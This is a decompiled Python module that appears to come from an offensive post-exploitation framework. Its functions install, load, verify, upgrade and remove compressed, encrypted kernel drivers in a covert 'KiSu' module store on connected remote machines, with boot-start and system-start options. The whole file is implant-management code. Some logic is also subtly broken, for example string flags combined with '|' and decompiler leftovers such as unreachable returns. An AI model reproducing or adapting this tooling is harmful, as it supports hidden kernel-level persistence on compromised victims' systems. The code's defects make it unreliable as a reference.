# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz
import dsz.file
import dsz.path
import dsz.version
import demi

def Install(project, driverName, localDriverName, startValue, typeValue, moduleId, moduleOrder, ask=True, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    else:
        if instance == None and not demi.EnsureConnected(ask):
            return False
        if ask and not dsz.ui.Prompt('Do you want to install the %s driver (%s.sys)?' % (project, driverName)):
            return False
        flags = 'Compressed|Encrypted|Kernel_Driver'
        if startValue == 0:
            flags = '%s|Boot_Start' % flags
        else:
            if startValue == 1:
                flags = '%s|System_Start' % flags
            elif startValue == 2:
                flags = '%s|Auto_Start' % flags
            if instance != None:
                instanceStr = '-instance 0x%08x ' % instance
            else:
                instanceStr = ''
            dsz.ui.Echo('Adding module into KiSu store')
            if dsz.cmd.Run('kisu_addmodule %s-name %s -order %d -id %d -project %s -localfile %s -flags %s' % (instanceStr, driverName, moduleOrder, moduleId, project, localDriverName, flags)):
                dsz.ui.Echo('    SUCCESS', dsz.GOOD)
                return True
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
        return


def Load(driverName, moduleId, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    else:
        if moduleId == 0:
            dsz.ui.Echo('* Invalid module id given', dsz.ERROR)
            return False
        if instance == None and not demi.EnsureConnected():
            return False
        if instance != None:
            instanceStr = '-instance 0x%08x ' % instance
        else:
            instanceStr = ''
        dsz.ui.Echo('Loading %s' % driverName)
        if dsz.cmd.Run('kisu_loaddriver %s-id %d' % (instanceStr, moduleId)):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            return True
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
        return


def Uninstall(project, driverName, moduleId, ask=True, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    rtn = True
    if len(driverName) == 0:
        dsz.ui.Echo('Invalid driver name given', dsz.ERROR)
        return False
    else:
        if instance == None and not demi.EnsureConnected(ask):
            return False
        if ask and not dsz.ui.Prompt('Do you want to uninstall the %s driver (%s.sys)?' % (project, driverName)):
            return False
        if instance != None:
            instanceStr = '-instance 0x%08x ' % instance
        else:
            instanceStr = ''
        dsz.ui.Echo('Unloading module')
        if dsz.cmd.Run('kisu_freedriver %s-id %d' % (instanceStr, moduleId)):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
        else:
            dsz.ui.Echo('    FAILED', dsz.ERROR)
        dsz.ui.Echo('Removing module from KiSu store')
        if dsz.cmd.Run('kisu_deletemodule %s-id %d' % (instanceStr, moduleId)):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            return rtn
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
        return


def Unload(driverName, moduleId, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    else:
        if instance == None and not demi.EnsureConnected():
            return False
        if instance != None:
            instanceStr = '-instance 0x%08x ' % instance
        else:
            instanceStr = ''
        dsz.ui.Echo('Unloading %s' % driverName)
        if dsz.cmd.Run('kisu_freedriver %s-id %d' % (instanceStr, moduleId)):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            return True
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
        return


def VerifyInstall(driverName, moduleId, startValue, typeValue, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    else:
        if moduleId == 0:
            dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
            return False
        if instance == None and not demi.EnsureConnected():
            return False
        if instance != None:
            instanceStr = '-instance 0x%08x ' % instance
        else:
            instanceStr = ''
        dsz.ui.Echo('Checking for presence of installed module')
        if not dsz.cmd.Run('kisu_config %s' % instanceStr, dsz.RUN_FLAG_RECORD):
            dsz.ui.Echo('    FAILED (Could not get KiSu configuration)', dsz.ERROR)
            return False
        try:
            modules = dsz.cmd.data.Get('configuration::module', dsz.TYPE_OBJECT)
            for module in modules:
                id = dsz.cmd.data.ObjectGet(module, 'id', dsz.TYPE_INT)[0]
                name = dsz.cmd.data.ObjectGet(module, 'moduleName', dsz.TYPE_STRING)[0]
                if moduleId != id or driverName.lower() != name.lower():
                    continue
                dsz.ui.Echo('    FOUND', dsz.GOOD)
                dsz.ui.Echo('Checking module configuration')
                if not dsz.cmd.data.ObjectGet(module, 'flags::kernel_driver', dsz.TYPE_BOOL)[0]:
                    dsz.ui.Echo('    FAILED (Module not registered as a driver)', dsz.ERROR)
                    return False
                if startValue == 0 and not dsz.cmd.data.ObjectGet(module, 'flags::boot_start', dsz.TYPE_BOOL)[0]:
                    dsz.ui.Echo('    FAILED (Module not registered to start at boot)', dsz.ERROR)
                    return False
                if startValue == 1 and not dsz.cmd.data.ObjectGet(module, 'flags::system_start', dsz.TYPE_BOOL)[0]:
                    dsz.ui.Echo('    FAILED (Module not registered to start with system)', dsz.ERROR)
                    return False
                dsz.ui.Echo('    PASSED', dsz.GOOD)
                return True

            dsz.ui.Echo('    FAILED (Module not found)', dsz.ERROR)
        except:
            dsz.ui.Echo('    FAILED (Searching caused an exception)', dsz.ERROR)
            return False

        return False


def VerifyRunning(driverName, moduleId, instance=None):
    dsz.ui.Echo('Retrieving list of system objects')
    if not dsz.cmd.Run('objects -path \\ -recursive', dsz.RUN_FLAG_RECORD):
        dsz.ui.Echo('    FAILED', dsz.ERROR)
    else:
        try:
            objects = dsz.cmd.data.Get('directoryitem::objectitem::name', dsz.TYPE_STRING)
            if driverName in objects:
                dsz.ui.Echo('    FOUND', dsz.GOOD)
                return True
            dsz.ui.Echo('    NOT FOUND (it could be being clever)', dsz.WARNING)
        except:
            raise
            dsz.ui.Echo('    FAILED (exception thrown)', dsz.ERROR)

    return False


def UpgradeDriver(project, drvName, moduleId, ask=True, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(drvName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    else:
        if len(project) == 0:
            dsz.ui.Echo('* Invalid project name given', dsz.ERROR)
            return False
        if moduleId == 0:
            dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
            return False
        if instance == None and not demi.EnsureConnected(ask):
            return False
        if instance != None:
            instanceStr = '-instance 0x%08x ' % instance
        else:
            instanceStr = ''
        dsz.ui.Echo('Checking for presence of installed module')
        if not dsz.cmd.Run('kisu_config %s' % instanceStr, dsz.RUN_FLAG_RECORD):
            dsz.ui.Echo('    FAILED (Could not get KiSu configuration)', dsz.ERROR)
            return False
        try:
            modules = dsz.cmd.data.Get('configuration::module', dsz.TYPE_OBJECT)
            for module in modules:
                id = dsz.cmd.data.ObjectGet(module, 'id', dsz.TYPE_INT)[0]
                name = dsz.cmd.data.ObjectGet(module, 'moduleName', dsz.TYPE_STRING)[0]
                if moduleId != id or drvName.lower() != name.lower():
                    continue
                dsz.ui.Echo('    FOUND', dsz.GOOD)
                dsz.ui.Echo('Copying configuration')
                order = dsz.cmd.data.ObjectGet(module, 'order', dsz.TYPE_INT)[0]
                procName = dsz.cmd.data.ObjectGet(module, 'processname', dsz.TYPE_STRING)[0]
                flagsStr = ''
                if dsz.cmd.data.ObjectGet(module, 'flags::encrypted', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'encrypted'
                if dsz.cmd.data.ObjectGet(module, 'flags::compressed', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'compressed'
                if dsz.cmd.data.ObjectGet(module, 'flags::demand_load', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'demand_load'
                if dsz.cmd.data.ObjectGet(module, 'flags::service_key', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'service_key'
                if dsz.cmd.data.ObjectGet(module, 'flags::user_mode', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'user_mode'
                if dsz.cmd.data.ObjectGet(module, 'flags::kernel_driver', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'kernel_driver'
                if dsz.cmd.data.ObjectGet(module, 'flags::boot_start', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'boot_start'
                if dsz.cmd.data.ObjectGet(module, 'flags::auto_start_once', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'auto_start_once'
                if dsz.cmd.data.ObjectGet(module, 'flags::system_start', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'system_start'
                if dsz.cmd.data.ObjectGet(module, 'flags::auto_start', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'auto_start'
                if dsz.cmd.data.ObjectGet(module, 'flags::system_mode', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'system_mode'
                dsz.ui.Echo('    PASSED', dsz.GOOD)
                dsz.ui.Echo('Deleting existing module')
                if not dsz.cmd.Run('kisu_deletemodule %s-id %u' % (instanceStr, id)):
                    dsz.ui.Echo('    FAILED', dsz.ERROR)
                    return False
                dsz.ui.Echo('    PASSED', dsz.GOOD)
                dsz.ui.Echo('Adding new module')
                if not dsz.cmd.Run('kisu_addmodule %s-project %s -name %s.sys -id 0x%08x -order 0x%08x -flags %s -localfile "%s" -process "%s"' % (instanceStr, project, drvName, id, order, flagsStr, name, procName)):
                    dsz.ui.Echo('    FAILED', dsz.ERROR)
                    dsz.ui.Echo('* Upgrade failed, and previous module cannot be recovered', dsz.ERROR)
                    return False
                dsz.ui.Echo('    PASSED', dsz.GOOD)
                dsz.ui.Echo('Upgrade complete (reboot required)')
                return True

        except:
            dsz.ui.Echo('    FAILED (Exception thrown)', dsz.ERROR)
            return False

        return False